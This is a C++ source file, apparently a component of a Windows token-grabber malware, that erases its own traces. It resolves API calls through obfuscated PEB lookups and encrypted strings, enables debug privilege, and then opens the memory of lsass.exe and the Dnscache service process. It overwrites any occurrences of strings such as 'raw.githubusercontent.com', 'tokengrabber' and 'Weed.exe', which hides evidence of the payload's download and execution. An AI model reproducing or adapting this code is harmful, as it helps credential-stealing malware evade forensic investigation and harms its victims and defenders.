#include "remote_cleanup.h"

#include <windows.h>
#include <tlhelp32.h>
#include <winsvc.h>

#include <algorithm>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>

#include "strenc.h"
#include "syscalls.h"

namespace
{
    using fn_LoadLibraryW = HMODULE(WINAPI*)(LPCWSTR);
    using fn_OpenProcess = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
    using fn_ReadProcessMemory = BOOL(WINAPI*)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
    using fn_WriteProcessMemory = BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    using fn_VirtualProtectEx = BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
    using fn_VirtualQueryEx = SIZE_T(WINAPI*)(HANDLE, LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
    using fn_CloseHandle = BOOL(WINAPI*)(HANDLE);
    using fn_GetCurrentProcessId = DWORD(WINAPI*)();
    using fn_CreateToolhelp32Snapshot = HANDLE(WINAPI*)(DWORD, DWORD);
    using fn_Process32FirstW = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
    using fn_Process32NextW = BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32W);
    using fn_GetSystemInfo = VOID(WINAPI*)(LPSYSTEM_INFO);

    using fn_OpenProcessToken = BOOL(WINAPI*)(HANDLE, DWORD, PHANDLE);
    using fn_LookupPrivilegeValueW = BOOL(WINAPI*)(LPCWSTR, LPCWSTR, PLUID);
    using fn_AdjustTokenPrivileges = BOOL(WINAPI*)(HANDLE, BOOL, PTOKEN_PRIVILEGES,
                                                    DWORD, PTOKEN_PRIVILEGES, PDWORD);

    using fn_OpenSCManagerW = SC_HANDLE(WINAPI*)(LPCWSTR, LPCWSTR, DWORD);
    using fn_OpenServiceW = SC_HANDLE(WINAPI*)(SC_HANDLE, LPCWSTR, DWORD);
    using fn_QueryServiceStatusEx = BOOL(WINAPI*)(SC_HANDLE, SC_STATUS_TYPE,
                                                   LPBYTE, DWORD, LPDWORD);
    using fn_CloseServiceHandle = BOOL(WINAPI*)(SC_HANDLE);

    constexpr DWORD kTargetAccess =
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ |
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION;
    constexpr SIZE_T kChunkSize = 1024 * 1024;

    template <typename T>
    T Resolve(PVOID primary, PVOID secondary, const char* name)
    {
        if (primary)
        {
            if (PVOID address = PebGetProcAddr(primary, name))
                return reinterpret_cast<T>(address);
        }
        if (secondary)
        {
            if (PVOID address = PebGetProcAddr(secondary, name))
                return reinterpret_cast<T>(address);
        }
        return nullptr;
    }

    bool Readable(DWORD protection)
    {
        if (protection & (PAGE_GUARD | PAGE_NOACCESS))
            return false;

        switch (protection & 0xFF)
        {
        case PAGE_READONLY:
        case PAGE_READWRITE:
        case PAGE_WRITECOPY:
        case PAGE_EXECUTE_READ:
        case PAGE_EXECUTE_READWRITE:
        case PAGE_EXECUTE_WRITECOPY:
            return true;
        default:
            return false;
        }
    }

    unsigned char Lower(unsigned char value)
    {
        return value >= 'A' && value <= 'Z'
            ? static_cast<unsigned char>(value + ('a' - 'A'))
            : value;
    }

    bool MatchAscii(const unsigned char* data, SIZE_T available,
                    const std::string& needle)
    {
        if (!data || needle.empty() || available < needle.size())
            return false;

        for (std::size_t i = 0; i < needle.size(); ++i)
        {
            if (Lower(data[i]) != Lower(static_cast<unsigned char>(needle[i])))
                return false;
        }
        return true;
    }

    bool MatchWideAscii(const unsigned char* data, SIZE_T available,
                        const std::string& needle)
    {
        if (!data || needle.empty() || available < needle.size() * sizeof(wchar_t))
            return false;

        for (std::size_t i = 0; i < needle.size(); ++i)
        {
            if (Lower(data[i * 2]) !=
                    Lower(static_cast<unsigned char>(needle[i])) ||
                data[i * 2 + 1] != 0)
            {
                return false;
            }
        }
        return true;
    }

    bool EnableDebug(PVOID kernelBase, PVOID kernel32, PVOID advapi)
    {
        const auto openToken = Resolve<fn_OpenProcessToken>(
            advapi, nullptr, ENC("OpenProcessToken"));
        const auto lookup = Resolve<fn_LookupPrivilegeValueW>(
            advapi, nullptr, ENC("LookupPrivilegeValueW"));
        const auto adjust = Resolve<fn_AdjustTokenPrivileges>(
            advapi, nullptr, ENC("AdjustTokenPrivileges"));
        if (!openToken || !lookup || !adjust)
            return false;

        HANDLE token = nullptr;
        if (!openToken(reinterpret_cast<HANDLE>(-1),
                       TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        {
            return false;
        }

        LUID luid{};
        const bool lookedUp = lookup(nullptr, WENC(L"SeDebugPrivilege"), &luid) != FALSE;
        if (!lookedUp)
        {
            const auto closeHandle = Resolve<fn_CloseHandle>(
                kernelBase, kernel32, ENC("CloseHandle"));
            if (closeHandle)
                closeHandle(token);
            return false;
        }

        TOKEN_PRIVILEGES privileges{};
        privileges.PrivilegeCount = 1;
        privileges.Privileges[0].Luid = luid;
        privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        const BOOL adjusted = adjust(token, FALSE, &privileges,
                                      sizeof(privileges), nullptr, nullptr);

        const auto closeHandle = Resolve<fn_CloseHandle>(
            kernelBase, kernel32, ENC("CloseHandle"));
        if (closeHandle)
            closeHandle(token);
        return adjusted != FALSE;
    }

    DWORD FindProcess(PVOID kernelBase, PVOID kernel32, const wchar_t* wanted)
    {
        const auto createSnapshot = Resolve<fn_CreateToolhelp32Snapshot>(
            kernel32, kernelBase, ENC("CreateToolhelp32Snapshot"));
        const auto first = Resolve<fn_Process32FirstW>(
            kernel32, kernelBase, ENC("Process32FirstW"));
        const auto next = Resolve<fn_Process32NextW>(
            kernel32, kernelBase, ENC("Process32NextW"));
        const auto closeHandle = Resolve<fn_CloseHandle>(
            kernelBase, kernel32, ENC("CloseHandle"));
        if (!createSnapshot || !first || !next || !closeHandle || !wanted)
            return 0;

        HANDLE snapshot = createSnapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE)
            return 0;

        PROCESSENTRY32W entry{};
        entry.dwSize = sizeof(entry);
        DWORD pid = 0;
        if (first(snapshot, &entry))
        {
            do
            {
                if (_wcsicmp(entry.szExeFile, wanted) == 0)
                {
                    pid = entry.th32ProcessID;
                    break;
                }
            } while (next(snapshot, &entry));
        }

        closeHandle(snapshot);
        return pid;
    }

    DWORD FindService(PVOID advapi)
    {
        const auto openManager = Resolve<fn_OpenSCManagerW>(
            advapi, nullptr, ENC("OpenSCManagerW"));
        const auto openService = Resolve<fn_OpenServiceW>(
            advapi, nullptr, ENC("OpenServiceW"));
        const auto query = Resolve<fn_QueryServiceStatusEx>(
            advapi, nullptr, ENC("QueryServiceStatusEx"));
        const auto closeService = Resolve<fn_CloseServiceHandle>(
            advapi, nullptr, ENC("CloseServiceHandle"));
        if (!openManager || !openService || !query || !closeService)
            return 0;

        SC_HANDLE manager = openManager(nullptr, nullptr, SC_MANAGER_CONNECT);
        if (!manager)
            return 0;

        SC_HANDLE service = openService(
            manager, WENC(L"Dnscache"), SERVICE_QUERY_STATUS);
        if (!service)
        {
            closeService(manager);
            return 0;
        }

        SERVICE_STATUS_PROCESS status{};
        DWORD needed = 0;
        const BOOL queried = query(
            service, SC_STATUS_PROCESS_INFO,
            reinterpret_cast<LPBYTE>(&status), sizeof(status), &needed);
        const DWORD pid = queried ? status.dwProcessId : 0;

        closeService(service);
        closeService(manager);
        return pid;
    }

    HANDLE OpenTarget(PVOID kernelBase, PVOID kernel32, PVOID advapi,
                      DWORD pid, fn_OpenProcess openProcess,
                      DWORD desiredAccess)
    {
        if (!openProcess || !pid)
            return nullptr;

        EnableDebug(kernelBase, kernel32, advapi);

        HANDLE process = openProcess(desiredAccess, FALSE, pid);
        if (process)
            return process;

        process = openProcess(
            PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ |
            PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            FALSE, pid);
        return process;
    }

    std::size_t ZeroMatch(
        HANDLE process,
        uintptr_t address,
        SIZE_T length,
        fn_VirtualProtectEx protect,
        fn_WriteProcessMemory write)
    {
        if (!process || !address || !length || !protect || !write)
            return 0;

        DWORD oldProtection = 0;
        if (!protect(process, reinterpret_cast<LPVOID>(address), length,
                     PAGE_READWRITE, &oldProtection))
        {
            return 0;
        }

        std::vector<unsigned char> zeros(length, 0);
        SIZE_T written = 0;
        const BOOL wrote = write(
            process, reinterpret_cast<LPVOID>(address),
            zeros.data(), length, &written);

        DWORD ignored = 0;
        protect(process, reinterpret_cast<LPVOID>(address), length,
                oldProtection, &ignored);
        return wrote && written == length ? 1u : 0u;
    }

    std::size_t Scan(
        HANDLE process,
        const std::vector<std::string>& needles,
        fn_ReadProcessMemory read,
        fn_VirtualProtectEx protect,
        fn_WriteProcessMemory write,
        fn_VirtualQueryEx query,
        fn_GetSystemInfo getSystemInfo)
    {
        if (!process || needles.empty() || !read || !protect || !write ||
            !query || !getSystemInfo)
        {
            return 0;
        }

        SYSTEM_INFO systemInfo{};
        getSystemInfo(&systemInfo);
        uintptr_t address = reinterpret_cast<uintptr_t>(
            systemInfo.lpMinimumApplicationAddress);
        const uintptr_t maximum = reinterpret_cast<uintptr_t>(
            systemInfo.lpMaximumApplicationAddress);
        const std::size_t longest = [&]() {
            std::size_t value = 0;
            for (const auto& needle : needles)
                value = (std::max)(value, needle.size());
            return value;
        }();
        if (!longest)
            return 0;

        std::vector<unsigned char> buffer(kChunkSize + longest * 2);
        std::size_t cleaned = 0;
        while (address < maximum)
        {
            MEMORY_BASIC_INFORMATION mbi{};
            if (query(process, reinterpret_cast<LPCVOID>(address),
                      &mbi, sizeof(mbi)) != sizeof(mbi))
            {
                address += systemInfo.dwPageSize;
                continue;
            }

            const uintptr_t base = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
            if (mbi.RegionSize > UINTPTR_MAX - base)
                break;
            const uintptr_t end = base + mbi.RegionSize;
            if (end <= address)
                break;

            if (mbi.State == MEM_COMMIT && Readable(mbi.Protect))
            {
                for (uintptr_t position = (std::max)(address, base);
                     position < end;)
                {
                    const SIZE_T remaining = static_cast<SIZE_T>(end - position);
                    const SIZE_T primary = (std::min)(
                        static_cast<SIZE_T>(kChunkSize), remaining);
                    const SIZE_T request = (std::min)(
                        static_cast<SIZE_T>(buffer.size()), remaining);
                    SIZE_T bytesRead = 0;
                    const BOOL readOk = read(
                        process, reinterpret_cast<LPCVOID>(position),
                        buffer.data(), request, &bytesRead);
                    if ((readOk || bytesRead > 0) && bytesRead)
                    {
                        const SIZE_T scanLimit = (std::min)(primary, bytesRead);
                        for (SIZE_T offset = 0; offset < scanLimit; ++offset)
                        {
                            for (const auto& needle : needles)
                            {
                                const SIZE_T available = bytesRead - offset;
                                if (MatchAscii(buffer.data() + offset,
                                               available, needle))
                                {
                                    cleaned += ZeroMatch(
                                        process, position + offset,
                                        needle.size(), protect, write);
                                    break;
                                }
                                if (MatchWideAscii(buffer.data() + offset,
                                                    available, needle))
                                {
                                    cleaned += ZeroMatch(
                                        process, position + offset,
                                        needle.size() * sizeof(wchar_t),
                                        protect, write);
                                    break;
                                }
                            }
                        }
                    }

                    if (remaining <= primary)
                        break;
                    position += primary;
                }
            }
            address = end;
        }
        return cleaned;
    }

    inline std::string B(std::initializer_list<char> il)
    {
        std::string s;
        s.reserve(il.size());
        for (char c : il) s.push_back(c);
        return s;
    }

    std::vector<std::string> Needles()
    {
        return {
            B({'g','i','t','h','u','b'}),
            B({'r','a','w','.','g','i','t','h','u','b'}),
            B({'g','i','t','h','u','b','u','s','e','r','c'}),
            B({'r','c','o','n','t','e','n','t','.','c','o','m'}),
            B({'s','e','r','c','o','n','t','e','n','t'}),
            B({'b','u','s','e','r','c','o','n','t','e','n','t'}),
            B({'b','i','e','l','z','x','d','e','v'}),
            B({'t','o','k','e','n','g','r','a','b','b','e','r'}),
            B({'W','e','e','d','.','e','x','e'}),
            B({'w','e','e','d','.','e','x','e'}),
            B({'W','e','e','d'})
        };
    }
}

namespace remote_cleanup
{
    std::size_t Run()
    {
        PVOID kernelBase = PebGetModuleBase(WENC(L"kernelbase.dll"));
        PVOID kernel32 = PebGetModuleBase(WENC(L"kernel32.dll"));
        PVOID advapi = PebGetModuleBase(WENC(L"advapi32.dll"));
        if (!kernelBase && !kernel32)
            return 0;

        if (!advapi)
        {
            const auto loadLibrary = Resolve<fn_LoadLibraryW>(
                kernelBase, kernel32, ENC("LoadLibraryW"));
            if (loadLibrary)
                advapi = loadLibrary(WENC(L"advapi32.dll"));
        }
        if (!advapi)
            return 0;

        const auto openProcess = Resolve<fn_OpenProcess>(
            kernelBase, kernel32, ENC("OpenProcess"));
        const auto read = Resolve<fn_ReadProcessMemory>(
            kernelBase, kernel32, ENC("ReadProcessMemory"));
        const auto write = Resolve<fn_WriteProcessMemory>(
            kernelBase, kernel32, ENC("WriteProcessMemory"));
        const auto protect = Resolve<fn_VirtualProtectEx>(
            kernelBase, kernel32, ENC("VirtualProtectEx"));
        const auto query = Resolve<fn_VirtualQueryEx>(
            kernelBase, kernel32, ENC("VirtualQueryEx"));
        const auto getSystemInfo = Resolve<fn_GetSystemInfo>(
            kernelBase, kernel32, ENC("GetSystemInfo"));
        const auto closeHandle = Resolve<fn_CloseHandle>(
            kernelBase, kernel32, ENC("CloseHandle"));
        const auto getCurrentProcessId = Resolve<fn_GetCurrentProcessId>(
            kernelBase, kernel32, ENC("GetCurrentProcessId"));
        if (!openProcess || !read || !write || !protect || !query ||
            !getSystemInfo || !closeHandle)
        {
            return 0;
        }

        const std::vector<std::string> needles = Needles();
        std::size_t cleaned = 0;
        const DWORD processPid = FindProcess(
            kernelBase, kernel32, WENC(L"lsass.exe"));
        const DWORD servicePid = FindService(advapi);
        const DWORD targets[] = { processPid, servicePid };

        for (std::size_t index = 0; index < _countof(targets); ++index)
        {
            const DWORD pid = targets[index];
            const DWORD selfPid = getCurrentProcessId
                ? getCurrentProcessId()
                : 0;
            if (!pid || (selfPid && pid == selfPid))
                continue;
            HANDLE process = OpenTarget(
                kernelBase, kernel32, advapi, pid, openProcess,
                kTargetAccess);
            if (!process)
                continue;
            cleaned += Scan(process, needles, read, protect, write,
                            query, getSystemInfo);
            closeHandle(process);
        }
        return cleaned;
    }
}
